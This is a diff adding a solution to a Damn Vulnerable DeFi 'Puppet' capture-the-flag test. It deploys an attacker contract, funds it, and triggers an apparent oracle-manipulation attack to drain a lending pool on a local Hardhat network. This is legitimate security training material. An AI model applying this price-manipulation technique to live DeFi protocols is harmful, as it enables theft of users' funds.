@@ -3,7 +3,7 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
-const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { setBalance, time } = require("@nomicfoundation/hardhat-network-helpers");
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -95,6 +95,26 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // To have depositAmount = 0, I have to get all the DVTs in the exchange.
+        // How much does 1 DVT cost in the exchange?
+        // console.log(await uniswapExchange.getTokenToEthInputPrice(10n ** 18n, { gasLimit: 1e6 }))
+
+        // How much Tokens I have to sell in order to drain all the ETH from the exchange?
+        // console.log(await uniswapExchange.getTokenToEthOutputPrice(9n * 10n ** 18n, { gasLimit: 1e6 }))
+
+        // by selling 1 DVT I buy 0,90661089 eth
+
+        const attacker = await (await ethers.getContractFactory('PuppetAttacker'))
+            .deploy(token.address, uniswapExchange.address, player.address, lendingPool.address, {value: ethers.utils.parseEther("15")});
+        expect(await ethers.provider.getBalance(attacker.address)).to.equal(ethers.utils.parseEther("15"));
+        await token
+            .connect(player)
+            .transfer(attacker.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        expect(await token.balanceOf(attacker.address)).to.equal(PLAYER_INITIAL_TOKEN_BALANCE);
+        
+        const timestamp = (await ethers.provider.getBlock('latest')).timestamp * 2
+        await attacker.triggerAttack(1000n * 10n ** 18n, 10n, timestamp)
     });
 
     after(async function () {
